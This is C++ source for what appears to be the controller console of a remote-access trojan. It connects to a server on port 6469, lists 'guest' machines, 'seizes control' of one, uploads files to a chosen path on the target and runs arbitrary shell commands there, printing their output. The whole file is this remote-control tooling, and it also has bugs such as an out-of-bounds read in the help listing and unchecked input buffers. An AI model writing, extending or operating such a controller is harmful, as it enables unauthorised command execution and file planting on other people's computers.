//filereg:host
//

#include "pch.h"
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")

SOCKET S;
int last_return;

int CONNECT(char* server_ip, unsigned short port = 6469)
{
	closesocket(S);
	S = socket(AF_INET, SOCK_STREAM, 0);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.S_un.S_addr = inet_addr(server_ip);
	return connect(S, (sockaddr*)&addr, sizeof(addr));
}

int get_guest_list()
{
	char cmd[] = "h1";
	if (send(S, cmd, 3, 0) == SOCKET_ERROR) return -1;
	char n;
	if (recv(S, &n, 1, 0) == SOCKET_ERROR) return -2;
	for (int i = 1; i <= n; ++i)
	{
		char c_ip[16];
		if (recv(S, &c_ip[0], 1, 0) == SOCKET_ERROR) return -2;
		int j = 0;
		while (c_ip[j])
		{
			++j;
			if (recv(S, &c_ip[j], 1, 0) == SOCKET_ERROR) return -2;
		}
		std::cout << "Guest " << i << ": " << c_ip << std::endl;
	}
	char S_re;
	if (recv(S, &S_re, 1, 0) == SOCKET_ERROR) return -2;
	return S_re;
}

int seize_control(unsigned char guest_index)
{
	char cmd[] = "h2";
	if (send(S, cmd, 3, 0) == SOCKET_ERROR) return -1;
	if (send(S, (const char*)&guest_index, 1, 0) == SOCKET_ERROR) return -1;
	char S_re;
	if (recv(S, &S_re, 1, 0) == SOCKET_ERROR) return -2;
	return S_re;
}

int show_target_detail()
{
	char cmd[] = "h3";
	if (send(S, cmd, 3, 0) == SOCKET_ERROR) return -1;
	char detail[1024];
	if (recv(S, detail, 1024, 0) == SOCKET_ERROR) return -2;
	std::cout << detail << std::endl;
	char S_re;
	if (recv(S, &S_re, 1, 0) == SOCKET_ERROR) return -2;
	return S_re;
}

int transport_file(char *file_path, char *target_path)
{
	char cmd[] = "h4";
	if (send(S, cmd, 3, 0) == SOCKET_ERROR) return -1;
	//传送文件名和文件路径
	int len = 0;
	while (target_path[len])
	{
		++len;
	}
	if (send(S, (const char*)target_path, len + 1, 0) == SOCKET_ERROR) return -1;
	//传送文件大小
	FILE *fp;
	if ((fp = fopen(file_path, "rb")) == NULL) return -3;
	fseek(fp, 0, SEEK_END);
	int size = ftell(fp);
	if (send(S, (const char *)&size, 4, 0) == SOCKET_ERROR) return -1;
	//传送文件
	fseek(fp, 0, SEEK_SET);
	char buffer[8192];
	while (int n = fread(buffer, 1, 8192, fp))
	{
		if (send(S, (const char*)buffer, n, 0) == SOCKET_ERROR) return -1;
	}
	//结束传送
	fclose(fp);
	char S_re;
	if (recv(S, &S_re, 1, 0) == SOCKET_ERROR) return -2;
	return S_re;
}

int transport_folder(char *folder_path, char *target_path)
{
	//TODO:trans folder
	return 0;
}

int sys(char *commandline)
{
	//发送指令
	char cmd[] = "h5";
	if (send(S, cmd, 3, 0) == SOCKET_ERROR) return -1;
	//发送命令行
	int i = 0;
	while (commandline[i])
	{
		++i;
	}
	if (send(S, (const char*)commandline, i, 0) == SOCKET_ERROR) return -1;
	//接收输出
	//假设：system 输出以\0结尾
	char buf[1024];
	if (recv(S, buf, 1, 0) == SOCKET_ERROR) return -2;
	i = 0;
	while (buf[i])
	{
		for (i = 0; i < 1024; ++i)
		{
			recv(S, &buf[i], 1, 0);
			if (!buf[i]) break;
		}
		std::cout << buf;
	}
	//接收结束标记
	char S_re;
	if (recv(S, &S_re, 1, 0) == SOCKET_ERROR) return -2;
	return S_re;
}

bool sae(char *A, const char *B)
{
	int i = 0;
	while (A[i])
	{
		if (A[i] != B[i])
		{
			return false;
		}
		++i;
	}
	if (B[i]) return false;
	return true;
}

void debug()
{
	std::cerr << "WSAGetLastError: " << WSAGetLastError() << std::endl;
}

void ans(int r)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
	std::cout << "RE:: ";
	if (r)
	{
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		std::cout << r << std::endl;
		debug();
	}
	else
	{
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		std::cout << r << std::endl;
	}
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

int main()
{
	WSADATA wsd;
	WSAStartup(MAKEWORD(2, 2), &wsd);

	char help[9][20] = {
		"shutdown",
		"CONNECT",
		"get_guest_list",
		"seize_control",
		"show_target_detail",
		"transport_file",
		"transport_folder",
		"sys",
		"help",
	};

	char cmd[32];
	while (true)
	{
		//std::cin.getline(cmd, 256);
		//TODO:完全的控制台
		last_return = 0;
		std::cout << '>';

		//==========命令行处理==========
		std::cin >> cmd;
		if (sae(cmd, "shutdown"))
		{
			break;
		}
		else if (sae(cmd, "CONNECT"))
		{
			char ip[16];
			//实现控制台可选参数
			std::cin >> ip;
			ans(CONNECT(ip));
		}
		else if (sae(cmd, "get_guest_list"))
		{
			ans(get_guest_list());
		}
		else if (sae(cmd, "seize_control"))
		{
			int index;
			std::cin >> index;
			ans(seize_control(index));
		}
		else if (sae(cmd, "show_target_detail"))
		{
			ans(show_target_detail());
		}
		else if (sae(cmd, "transport_file"))
		{
			char path1[256], path2[256];
			std::cin >> path1 >> path2;
			ans(transport_file(path1, path2));
		}
		else if (sae(cmd, "transport_folder"))
		{
			std::cout << "===function under construnction===" << std::endl;
		}
		else if (sae(cmd, "sys"))
		{
			char commandline[1024];
			std::cin.ignore();
			std::cin.getline(commandline, 1024);
			sys(commandline);
		}
		else if (sae(cmd, "help"))
		{
			for (int i = 0; i < 10; ++i)
			{
				std::cout << help[i] << std::endl;
			}
		}
		else
		{
			std::cout << "command invalied, use \"help\" to show all avaliable commands." << std::endl;
		}
		//==========命令行处理==========

		if (last_return) debug();
		std::cout << std::endl;
	}
	closesocket(S);
	WSACleanup();
	return 0;
}
